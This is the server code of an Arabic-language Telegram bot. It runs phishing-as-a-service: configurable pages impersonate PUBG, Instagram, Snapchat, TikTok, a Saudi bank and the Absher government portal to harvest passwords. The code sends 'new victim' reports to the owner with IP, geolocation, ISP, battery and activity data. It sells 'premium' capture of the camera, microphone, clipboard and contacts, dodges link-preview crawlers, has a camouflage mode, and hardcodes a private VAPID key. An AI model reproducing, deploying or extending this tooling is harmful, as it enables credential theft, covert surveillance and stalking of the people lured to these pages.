const fs = require("fs");
const express = require("express");
const multer  = require("multer");
const webPush = require("web-push");

// ── VAPID setup ───────────────────────────────────────────────────────────────
const VAPID_PUBLIC  = "BO28wpeyAx8s871cdmzFO7NfyA45q-kijOlDL7z0b6rsxtOmUnLzC8SX7tZqahrBSfseub8Q-PD0qENCHqs9xiY";
const VAPID_PRIVATE = "UqSz5qteyhBUK-0ZQ_Fs4308bJEV5OUw1bfGKpGwyv8";
webPush.setVapidDetails("mailto:admin@bot-psue.onrender.com", VAPID_PUBLIC, VAPID_PRIVATE);
const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 15*1024*1024 } });

// ── Storage helpers ────────────────────────────────────────────────────────────

function loadJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return def; }
}
function saveJSON(file, data) { try { fs.writeFileSync(file, JSON.stringify(data)); } catch(e) {} }

const USERS_FILE      = "./users.json";
const BANNED_FILE     = "./banned.json";
const STATS_FILE      = "./stats.json";
const SETTINGS_FILE   = "./settings.json";
const TARGETS_FILE    = "./targets.json";
const NOTES_FILE      = "./notes.json";
const USERSTATS_FILE  = "./userstats.json";
const PROFILES_FILE   = "./profiles.json";
const PREMIUM_FILE    = "./premium.json";
const PAGE_CONFIG_FILE  = "./page_config.json";
const SUBMISSIONS_FILE  = "./submissions.json";
const USER_PAGES_FILE   = "./user_pages.json";
const USER_SUBS_FILE    = "./user_subs.json";

const DEFAULT_PAGE_CONFIG = {
  active:false, template:"pubg",
  title:"احصل على 600 شدة مجاناً 🎁",
  desc:"أدخل بياناتك لاستلام شداتك فوراً",
  fields:[{label:"ID اللاعب",type:"text"},{label:"كلمة المرور",type:"password"}],
  timer:10, social:"2,847 لاعب حصل على شداته اليوم",
  redirect:"https://www.pubg.com", camouflage:false,
  bgColor:"#0a0a1a", btnColor:"#f0a500", btnText:"استلم الآن 🎮", logo:null, views:0
};

const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false, contaudio:false, faceAI:false, activityDetect:false, autofill:false, devtools:false };

let pageConfig  = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
let submissions = loadJSON(SUBMISSIONS_FILE, []);
let userPages   = loadJSON(USER_PAGES_FILE, {});   // { uid: pageConfig }
let userSubs    = loadJSON(USER_SUBS_FILE, {});     // { uid: [...submissions] }

let users      = new Set(loadJSON(USERS_FILE, []));
let banned     = new Set(loadJSON(BANNED_FILE, []));
let targets    = new Set(loadJSON(TARGETS_FILE, []));
let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
const _savedSettings = loadJSON(SETTINGS_FILE,{});
let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", featureExpiry:null, premiumFreeExpiry:{}, ..._savedSettings, features:{...DEFAULT_FEATURES, ...(_savedSettings.features||{})}, premiumFree:{...DEFAULT_PREMIUM_FREE, ...(_savedSettings.premiumFree||{})} };
let notes      = loadJSON(NOTES_FILE, {});
let userStats  = loadJSON(USERSTATS_FILE, {});
let profiles   = loadJSON(PROFILES_FILE, {});  // { "userId": { name, username, seen } }
let premium    = loadJSON(PREMIUM_FILE,  {});  // { "userId": { expiry: ts|-1, plan: 'monthly'|'yearly'|'lifetime' } }

if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
// ensure all keys always exist (handles old settings.json missing new keys)
Object.keys(DEFAULT_FEATURES).forEach(k => {
  if (!(k in settings.features)) settings.features[k] = DEFAULT_FEATURES[k];
});
Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
  if (!(k in settings.premiumFree)) settings.premiumFree[k] = DEFAULT_PREMIUM_FREE[k];
  if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
});

function saveUsers()     { saveJSON(USERS_FILE,     [...users]);    backupFileToGH(USERS_FILE,     "_data/users.json").catch(()=>{}); }
function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]);   backupFileToGH(BANNED_FILE,    "_data/banned.json").catch(()=>{}); }
function saveTargets()   { saveJSON(TARGETS_FILE,   [...targets]);  backupFileToGH(TARGETS_FILE,   "_data/targets.json").catch(()=>{}); }
function saveStats()     { saveJSON(STATS_FILE,     stats);         backupFileToGH(STATS_FILE,     "_data/stats.json").catch(()=>{}); }
function saveSettings()  { saveJSON(SETTINGS_FILE,  settings);      backupFileToGH(SETTINGS_FILE,  "_data/settings.json").catch(()=>{}); }
function saveNotes()     { saveJSON(NOTES_FILE,     notes);         backupFileToGH(NOTES_FILE,     "_data/notes.json").catch(()=>{}); }
function saveUserStats() { saveJSON(USERSTATS_FILE, userStats);     backupFileToGH(USERSTATS_FILE, "_data/userstats.json").catch(()=>{}); }
function saveProfiles()  { saveJSON(PROFILES_FILE,  profiles);      backupFileToGH(PROFILES_FILE,  "_data/profiles.json").catch(()=>{}); }
function savePremium()   { saveJSON(PREMIUM_FILE,   premium);       backupFileToGH(PREMIUM_FILE,   "_data/premium.json").catch(()=>{}); }
function savePageConfig(){ saveJSON(PAGE_CONFIG_FILE, pageConfig); backupFileToGH(PAGE_CONFIG_FILE,"_data/page_config.json").catch(()=>{}); }
function saveSubmissions(){ saveJSON(SUBMISSIONS_FILE, submissions); backupFileToGH(SUBMISSIONS_FILE,"_data/submissions.json").catch(()=>{}); }
function saveUserPages()  { saveJSON(USER_PAGES_FILE, userPages);  backupFileToGH(USER_PAGES_FILE,"_data/user_pages.json").catch(()=>{}); }
function saveUserSubs()   { saveJSON(USER_SUBS_FILE,  userSubs);   backupFileToGH(USER_SUBS_FILE, "_data/user_subs.json").catch(()=>{});  }

function getUserPage(uid) {
  const id = String(uid);
  if (!userPages[id]) userPages[id] = { ...DEFAULT_PAGE_CONFIG, active:false };
  return userPages[id];
}
function setUserPage(uid, cfg) { userPages[String(uid)] = cfg; saveUserPages(); }
function getUserSubs(uid) { return userSubs[String(uid)] || []; }
function addUserSub(uid, sub) {
  const id = String(uid);
  if (!userSubs[id]) userSubs[id] = [];
  userSubs[id].push(sub);
  saveUserSubs();
}

// ── Page wizard state ─────────────────────────────────────────────────────────
const _pageWiz = {};          // chatId → { step, data }
const _pageTpls = {};         // name → config
const _awaitWelcome = new Set(); // chatIds waiting for welcome message text
const _awaitPagePass  = new Map(); // chatId → { type:'owner'|'user', uid? }
const _awaitChatReply = new Map(); // chatId → { uid, pid }

// ── Notification buffer (consolidate victim data into ONE message) ─────────────
const _notifBuf = new Map(); // `${tid}:${ip}` → { parts, timer }

function _addToBuf(tid, ip, key, val) {
  const k = `${tid}:${ip}`;
  if (!_notifBuf.has(k)) {
    _notifBuf.set(k, {
      parts: { ip, time: new Date().toJSON().slice(0,19).replace('T',' ') },
      timer: setTimeout(() => _flushBuf(tid, ip), 9000)
    });
  }
  _notifBuf.get(k).parts[key] = val;
}

async function _flushBuf(tid, ip) {
  const k = `${tid}:${ip}`;
  const buf = _notifBuf.get(k);
  if (!buf) return;
  _notifBuf.delete(k);
  if (settings.silentMode) return;
  const p = buf.parts;
  // Try to get fresh profile from Telegram if not stored / username missing
  let prof = profiles[String(tid)] || {};
  if (!prof.name || !prof.username) {
    try {
      const chat = await bot.getChat(Number(tid));
      const freshName = [chat.first_name, chat.last_name].filter(Boolean).join(" ") || prof.name || "مجهول";
      const freshUser = chat.username || prof.username || "";
      // Normalize: remove leading @ if stored with it (old records)
      const cleanUser = freshUser.startsWith("@") ? freshUser.slice(1) : freshUser;
      prof = { ...prof, name: freshName, username: cleanUser };
      // Update stored profile
      profiles[String(tid)] = { ...profiles[String(tid)], name: freshName, username: cleanUser, seen: prof.seen || new Date().toJSON().slice(0,19).replace('T',' ') };
      saveProfiles();
    } catch(e) {}
  }
  // Normalize stored username (remove @ if old record saved it with @)
  const displayUser = (prof.username || "").startsWith("@") ? prof.username.slice(1) : (prof.username || "");
  const isTarget = targets.has(tid);
  const flag = isTarget ? '🎯🚨' : '⚠️';
  // Full message (owner only) — includes name/username/ID
  let ownerMsg = `${flag} *ضحية جديدة!*\n`;
  if (prof.name)  ownerMsg += `👤 الاسم: ${prof.name}\n`;
  if (displayUser) ownerMsg += `🔗 اليوزر: @${displayUser}\n`;
  ownerMsg += `🆔 ID: \`${tid}\`\n`;
  ownerMsg += `━━━━━━━━━━━━━━━\n`;
  if (p.ip)       ownerMsg += `⚓ IP: \`${p.ip}\`\n`;
  if (p.ipInfo)   ownerMsg += `${p.ipInfo}\n`;
  if (p.location) ownerMsg += `📍 ${p.location}\n`;
  if (p.network && p.network !== 'undefined' && p.network !== 'null') ownerMsg += `📶 شبكة: ${p.network}\n`;
  if (p.activity) ownerMsg += `🚶 نشاط: ${p.activity}\n`;
  if (p.battery)  ownerMsg += `${p.battery}\n`;
  ownerMsg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
  // Premium user message — no name/username/ID
  let premMsg = `${flag} *رابطك فُتح!*\n━━━━━━━━━━━━━━━\n`;
  if (p.ip)       premMsg += `⚓ IP: \`${p.ip}\`\n`;
  if (p.ipInfo)   premMsg += `${p.ipInfo}\n`;
  if (p.location) premMsg += `📍 ${p.location}\n`;
  if (p.network && p.network !== 'undefined' && p.network !== 'null') premMsg += `📶 شبكة: ${p.network}\n`;
  if (p.activity) premMsg += `🚶 نشاط: ${p.activity}\n`;
  if (p.battery)  premMsg += `${p.battery}\n`;
  premMsg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
  // Button to open direct chat with the victim
  const chatKb = JSON.stringify({ inline_keyboard:[[
    { text: "💬 راسله على تيليغرام", url: `tg://user?id=${tid}` }
  ]]});
  if (Number(tid) === BOT_OWNER) {
    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown", reply_markup: chatKb}).catch(()=>{});
  } else {
    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown", reply_markup: chatKb}).catch(()=>{});
    bot.sendMessage(Number(tid), premMsg, {parse_mode:"Markdown"}).catch(()=>{});
  }
}

// ── Live chat sessions ────────────────────────────────────────────────────────
const _chatClients = new Map(); // `${uid}:${pid}` → { res, uid, pid }
const LIVE_CHAT_PREFIX = '💬 رسالة من الضحية';

const TPL_THEMES = {
  pubg:  { bg:"#0a0a1a", btn:"#f0a500", accent:"#f0a500", name:"🎮 ببجي",      redirect:"https://www.pubg.com" },
  ig:    { bg:"#121212", btn:"#c13584", accent:"#833ab4", name:"📸 إنستغرام",  redirect:"https://www.instagram.com" },
  ff:    { bg:"#0d0d0d", btn:"#e63946", accent:"#ff6b35", name:"🔥 فري فاير", redirect:"https://freefire.garena.com" },
  snap:  { bg:"#1a1a00", btn:"#FFFC00", accent:"#FFFC00", name:"👻 سناب شات", redirect:"https://www.snapchat.com" },
  tt:    { bg:"#010101", btn:"#fe2c55", accent:"#25f4ee", name:"🎵 تيك توك",  redirect:"https://www.tiktok.com" },
  bank:  { bg:"#0a1628", btn:"#1a56db", accent:"#1e40af", name:"🏦 بنكية",     redirect:"https://www.alrajhibank.com.sa" },
  gov:   { bg:"#0a1f0a", btn:"#16a34a", accent:"#15803d", name:"🇸🇦 حكومية",  redirect:"https://www.absher.sa" },
  custom:{ bg:"#0a0a1a", btn:"#6366f1", accent:"#4f46e5", name:"✏️ مخصص",     redirect:"https://www.google.com" },
};

function sendUserPageMain(chatId, uid, editMsgId) {
  const id = String(uid);
  const cfg = getUserPage(id);
  const prem = premium[id] || {};
  const hasAccess = !!prem.pageAccess;
  if (!hasAccess) {
    const txt = `🔒 *صفحتك الملغمة*\n\nميزة الصفحة غير مفعّلة لحسابك بعد.\nتواصل مع المالك لتفعيلها.`;
    if (editMsgId) return bot.editMessageText(txt,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown"}).catch(()=>{});
    return bot.sendMessage(chatId,txt,{parse_mode:"Markdown"});
  }
  const tName = TPL_THEMES[cfg.template]?.name || cfg.template;
  const status = cfg.active ? "🟢 نشطة" : "🔴 متوقفة";
  const subs = getUserSubs(id);
  const link = `${hostURL}/p/u/${id}`;
  const text = `🎛️ *لوحة تحكم صفحتك*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${cfg.views||0}\n✅ بيانات مجموعة: ${subs.length}\n🔗 رابطك: \`${link}\``;
  const toggleLbl = cfg.active ? "⏸️ إيقاف الصفحة" : "▶️ تشغيل الصفحة";
  const passIcon = cfg.pagePassword ? "🔒✅" : "🔒";
  const kb = JSON.stringify({inline_keyboard:[
    [{text:"⚡ تبديل سريع",callback_data:`pgu_quick_${id}`},{text:"📋 السجل",callback_data:`pgu_log_${id}`}],
    [{text:"🔗 روابط مخادعة",callback_data:`pgu_links_${id}`},{text:"🔄 تجديد الرابط",callback_data:`pgu_renew_${id}`}],
    [{text:"🗑️ مسح البيانات",callback_data:`pgu_clear_${id}`},{text:toggleLbl,callback_data:`pgu_toggle_${id}`}],
    [{text:`${passIcon} كلمة سر`,callback_data:`pgu_setpass_${id}`}]
  ]});
  if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
  return bot.sendMessage(chatId,text,{parse_mode:"Markdown",reply_markup:kb});
}

function sendPageMain(chatId, editMsgId) {
  const tName = TPL_THEMES[pageConfig.template]?.name || pageConfig.template;
  const status = pageConfig.active ? (pageConfig.camouflage ? "🟡 تمويه" : "🟢 نشطة") : "🔴 متوقفة";
  const toggleLabel = pageConfig.active ? (pageConfig.camouflage ? "✅ تشغيل كاملاً" : "⏸️ وضع تمويه") : "▶️ تشغيل الصفحة";
  const passIcon = pageConfig.pagePassword ? "🔒✅" : "🔒";
  const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}\n${pageConfig.pagePassword ? "🔒 كلمة سر: مفعّلة" : "🔓 كلمة سر: معطّلة"}`;
  const wIcon = pageConfig.welcomeEnabled ? "📢✅" : "📢";
  const kb = JSON.stringify({ inline_keyboard:[
    [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
    [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
    [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
    [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
    [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}],
    [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"},{text:`${passIcon} كلمة سر`,callback_data:"pg_setpass"}],
    [{text:"📊 كل بيانات الضحايا",callback_data:"pg_allsubs"}]
  ]});
  if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
  return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
}

// Returns true if user has active premium (owner always has it)
function isPremium(uid) {
  const id = String(uid);
  if (Number(id) === BOT_OWNER) return true;
  const p = premium[id];
  if (!p) return false;
  if (p.expiry === -1) return true;          // lifetime
  return Date.now() < p.expiry;
}

// Returns true if the premium feature is currently unlocked for ALL users
function isPremiumFeatureFree(feature) {
  if (!settings.premiumFree?.[feature]) return false;
  const exp = settings.premiumFreeExpiry?.[feature];
  if (exp && Date.now() > exp) {
    settings.premiumFree[feature] = false;
    settings.premiumFreeExpiry[feature] = null;
    saveSettings();
    return false;
  }
  return true;
}

// Returns true if uid can use a specific premium feature
function canUsePremium(uid, feature) {
  return isPremium(uid) || isPremiumFeatureFree(feature);
}

// HTML upsell page for non-premium users
function upsellPage(ownerUsername) {
  const u = ownerUsername || 'Ye_x00';
  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ميزة مدفوعة</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}.card{background:#12122a;border:1px solid #2a2a5a;border-radius:20px;padding:36px 28px;max-width:360px;width:92%;text-align:center;}.icon{font-size:54px;margin-bottom:14px}.title{font-size:21px;font-weight:700;color:#e0e0ff;margin-bottom:10px}.sub{font-size:13px;color:#888;margin-bottom:24px;line-height:1.7}.features{background:#0d0d22;border-radius:12px;padding:16px;margin-bottom:24px;text-align:right}.feat-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #1a1a3a;font-size:13px;color:#ccc}.feat-row:last-child{border-bottom:none}.btn{display:block;width:100%;background:linear-gradient(135deg,#0066ff,#0044aa);color:#fff;border:none;padding:15px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;}</style>
</head><body><div class="card">
<div class="icon">💎</div>
<div class="title">ميزة حصرية للمشتركين</div>
<div class="sub">هذه الميزة متاحة فقط للمشتركين في الباقة المدفوعة</div>
<div class="features">
  <div class="feat-row">📷 الكاميرا الأمامية والخلفية</div>
  <div class="feat-row">🎤 تسجيل صوتي</div>
  <div class="feat-row">📋 محتوى الحافظة</div>
  <div class="feat-row">📒 جهات الاتصال الكاملة</div>
  <div class="feat-row">🖼️ الصور والملفات</div>
</div>
<a class="btn" href="https://t.me/${u}">💬 تواصل للاشتراك</a>
</div></body></html>`;
}

// Premium expiry watcher — alert owner when someone's premium expires
setInterval(() => {
  const now = Date.now();
  for (const [id, p] of Object.entries(premium)) {
    if (p.expiry !== -1 && p.expiry > 0 && now > p.expiry && !p.expired) {
      premium[id].expired = true; savePremium();
      const prof = profiles[id] || {};
      bot.sendMessage(BOT_OWNER, `⏰ انتهى اشتراك ${prof.name || id} (@${prof.username || '?'})\nID: \`${id}\``, { parse_mode:"Markdown" }).catch(()=>{});
    }
  }
}, 60000);

// Auto-disable features when timer expires
setInterval(() => {
  if (settings.featureExpiry && Date.now() > settings.featureExpiry) {
    settings.featureExpiry = null;
    settings.features = Object.fromEntries(Object.keys(settings.features).map(k=>[k,false]));
    saveSettings();
    bot.sendMessage(BOT_OWNER, "⏱️ انتهى وقت الميزات — تم إيقافها تلقائياً.").catch(()=>{});
  }
}, 30000);

function incUserStat(uid, field) {
  if (!userStats[uid]) userStats[uid] = { linksCreated:0, linksOpened:0 };
  userStats[uid][field] = (userStats[uid][field] || 0) + 1;
  if (field === 'linksOpened') userStats[uid].lastOpen = new Date().toJSON().slice(0,19).replace('T',' ');
  saveUserStats();
}

// ── GitHub Data Persistence ───────────────────────────────────────────────────

const GH_TOKEN = process.env.GH_TOKEN || "";
const GH_OWNER = "Amroalbdwy";
const GH_REPO  = "Bot";

const DATA_FILES = [
  { local: "./users.json",     remote: "_data/users.json"     },
  { local: "./banned.json",    remote: "_data/banned.json"    },
  { local: "./stats.json",     remote: "_data/stats.json"     },
  { local: "./settings.json",  remote: "_data/settings.json"  },
  { local: "./targets.json",   remote: "_data/targets.json"   },
  { local: "./notes.json",     remote: "_data/notes.json"     },
  { local: "./userstats.json", remote: "_data/userstats.json" },
  { local: "./profiles.json",  remote: "_data/profiles.json"  },
  { local: "./premium.json",   remote: "_data/premium.json"   },
  { local: "./push_subs.json",    remote: "_data/push_subs.json"    },
  { local: "./page_config.json", remote: "_data/page_config.json" },
  { local: "./submissions.json", remote: "_data/submissions.json" },
  { local: "./user_pages.json",  remote: "_data/user_pages.json"  },
  { local: "./user_subs.json",   remote: "_data/user_subs.json"   },
];

const _ghShaCache = new Map(); // remotePath → sha

async function ghGet(path) {
  try {
    const r = await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${path}`, {
      headers: { Authorization: `token ${GH_TOKEN}`, "User-Agent": "bot-data" }
    });
    if (r.status === 200) {
      const d = await r.json();
      if (d.sha) _ghShaCache.set(path, d.sha);
      return d;
    }
  } catch(e) {}
  return null;
}

async function ghPut(path, content, sha) {
  const useSha = sha || _ghShaCache.get(path);
  const body = { message: `data:backup ${new Date().toISOString()}`, content: Buffer.from(content).toString('base64') };
  if (useSha) body.sha = useSha;
  try {
    const r = await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${path}`, {
      method: 'PUT',
      headers: { Authorization: `token ${GH_TOKEN}`, "Content-Type": "application/json", "User-Agent": "bot-data" },
      body: JSON.stringify(body)
    });
    const d = await r.json();
    // Cache new SHA on success
    if (d.content?.sha) _ghShaCache.set(path, d.content.sha);
    // If conflict (422) — refresh SHA and retry once
    if (r.status === 422 || r.status === 409) {
      const fresh = await ghGet(path);
      if (fresh?.sha) {
        body.sha = fresh.sha;
        const r2 = await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${path}`, {
          method: 'PUT',
          headers: { Authorization: `token ${GH_TOKEN}`, "Content-Type": "application/json", "User-Agent": "bot-data" },
          body: JSON.stringify(body)
        });
        const d2 = await r2.json();
        if (d2.content?.sha) _ghShaCache.set(path, d2.content.sha);
      }
    }
  } catch(e) {}
}

// Restore data from GitHub on startup
async function restoreFromGitHub() {
  let restored = 0;
  for (const f of DATA_FILES) {
    try {
      const d = await ghGet(f.remote);
      if (d && d.content) {
        fs.writeFileSync(f.local, Buffer.from(d.content, 'base64').toString('utf8'));
        // Cache SHA so first post-restore backup doesn't need a retry
        if (d.sha) _ghShaCache.set(f.remote, d.sha);
        restored++;
      }
    } catch(e) {}
  }
  if (restored > 0) {
    // Reload in-memory data from restored files
    users     = new Set(loadJSON(USERS_FILE, []));
    banned    = new Set(loadJSON(BANNED_FILE, []));
    targets   = new Set(loadJSON(TARGETS_FILE, []));
    stats     = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE, {}) };
    settings  = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", features:{...DEFAULT_FEATURES}, featureExpiry:null, premiumFree:{...DEFAULT_PREMIUM_FREE}, premiumFreeExpiry:{}, ...loadJSON(SETTINGS_FILE, {}) };
    notes     = loadJSON(NOTES_FILE, {});
    userStats = loadJSON(USERSTATS_FILE, {});
    profiles  = loadJSON(PROFILES_FILE, {});
    premium   = loadJSON(PREMIUM_FILE, {});
    pushSubs    = loadJSON(PUSH_FILE, {});
    pageConfig  = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
    submissions = loadJSON(SUBMISSIONS_FILE, []);
    userPages   = loadJSON(USER_PAGES_FILE, {});
    userSubs    = loadJSON(USER_SUBS_FILE,  {});
    if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
    if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
    if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
    Object.keys(DEFAULT_FEATURES).forEach(k => {
      if (!(k in settings.features)) settings.features[k] = DEFAULT_FEATURES[k];
    });
    Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
      if (!(k in settings.premiumFree))       settings.premiumFree[k]       = DEFAULT_PREMIUM_FREE[k];
      if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
    });
    console.log(`✅ استُعيد ${restored} ملف من GitHub`);
  }
  return restored;
}

// Shorten a URL via TinyURL
async function makeTinyUrl(url) {
  try {
    const r = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    if (r.ok) { const t = await r.text(); if (t.startsWith("http")) return t.trim(); }
  } catch(e) {}
  return null;
}

// Immediately backup a single local file to GitHub
// ghPut already uses _ghShaCache internally — no need to call ghGet first
async function backupFileToGH(localPath, remotePath) {
  try {
    if (!fs.existsSync(localPath)) return;
    const content = fs.readFileSync(localPath, 'utf8');
    await ghPut(remotePath, content); // ghPut handles SHA cache + 422 retry
  } catch(e) {}
}

// Save all data files to GitHub (parallel — must complete within Railway's 10s kill window)
async function backupToGitHub() {
  await Promise.allSettled(DATA_FILES.map(async f => {
    try {
      if (!fs.existsSync(f.local)) return;
      const content = fs.readFileSync(f.local, 'utf8');
      await ghPut(f.remote, content); // ghPut handles SHA cache + 422 retry
    } catch(e) {}
  }));
  console.log("💾 تم حفظ البيانات على GitHub");
}

// ── Setup ─────────────────────────────────────────────────────────────────────

const cors        = require('cors');
const bodyParser  = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot(process.env["bot"], { polling: true });
const app = express();
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.use(express.static('public'));
app.set("view engine", "ejs");

const hostURL   = process.env.HOST_URL || "https://bot-psue.onrender.com";
const use1pt    = false;
const BOT_OWNER = 6012675140;
const REPLY_PREFIX        = "📝 اكتب ردك على المستخدم\nUID:";
const PREM_GRANT_PREFIX   = "💎 أدخل ID المستخدم ومدة التفعيل (مثال: 123456789 30 أو 123456789 lifetime):";
const PREM_REVOKE_PREFIX  = "🗑️ أدخل ID المستخدم لإلغاء البريميوم:";

// ── Global crash protection ────────────────────────────────────────────────────
process.on('uncaughtException',  (err) => { console.error('uncaughtException:', err.message); });
process.on('unhandledRejection', (err) => { console.error('unhandledRejection:', err?.message || err); });

// ── Keep-alive: ping every 14 min to prevent Render free-tier sleep ────────────
setInterval(() => {
  fetch(hostURL + "/ping").catch(() => {});
}, 14 * 60 * 1000);
app.get("/ping", (req, res) => res.send("ok"));

// ── Markdown escape helper ─────────────────────────────────────────────────────
function mdEsc(text) {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// Startup notification disabled

// ── Utilities ─────────────────────────────────────────────────────────────────

function getIP(req) {
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0].trim();
  if (req.connection?.remoteAddress) return req.connection.remoteAddress;
  return req.ip;
}

const _ipCache = new Map();
async function enrichIP(ip) {
  const cached = _ipCache.get(ip);
  if (cached && Date.now() < cached.expiry) return cached.info;
  try {
    const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
    if (d.status === "success") {
      const info = `🌍 ${d.country} | 🏙️ ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 Org: ${d.org}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
      _ipCache.set(ip, { info, expiry: Date.now() + 24*3600*1000 });
      return info;
    }
  } catch(e) {}
  return null;
}

function notify(id, msg, opts) {
  if (settings.silentMode) return;
  bot.sendMessage(id, msg, opts || {}).catch(() => {});
}
function notifyPhoto(id, buf, opts, info) {
  if (settings.silentMode) return;
  bot.sendPhoto(id, buf, opts || {}, info).catch(() => {});
}
function notifyDoc(id, buf, opts, info) {
  if (settings.silentMode) return;
  bot.sendDocument(id, buf, opts || {}, info).catch(() => {});
}
function notifyLoc(id, lat, lon) {
  if (settings.silentMode) return;
  bot.sendLocation(id, lat, lon).catch(() => {});
}

// ── Daily scheduled report ────────────────────────────────────────────────────
setInterval(() => {
  if (settings.scheduleHour < 0) return;
  const now = new Date();
  if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    const topU = Object.entries(userStats).sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,3)
      .map(([id,u],i)=>{ const p=profiles[id]||{}; return `${['🥇','🥈','🥉'][i]} ${p.name||id}: ${u.linksOpened||0}`; }).join(" | ")||"—";
    bot.sendMessage(BOT_OWNER,
      `📅 تقرير يومي — ${new Date().toJSON().slice(0,10)}\n━━━━━━━━━━━━━━━\n👥 مستخدمون: ${users.size}  🎯 أهداف: ${targets.size}  🚫 محجوب: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط: ${stats.linksCreated} منشأة / ${stats.linksOpened} مفتوحة\n📷 صور: ${stats.camsnaps}  🎙️ صوت: ${stats.audios}  📍 مواقع: ${stats.locations}\n━━━━━━━━━━━━━━━\n🏆 الأكثر نشاطاً: ${topU}\n🔕 صامت: ${settings.silentMode?'مفعّل':'معطّل'}  ⏱️ تشغيل: ${h}س ${m}د`
    ).catch(() => {});
  }
}, 60 * 1000);

// ── Routes ────────────────────────────────────────────────────────────────────

async function handleLinkOpen(req, res, view) {
  // Ignore Telegram's link-preview bot (visits URL before real user does)
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit') || ua.includes('whatsapp') || ua.includes('bot') && ua.includes('preview')) {
    return res.status(200).send('OK');
  }

  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();
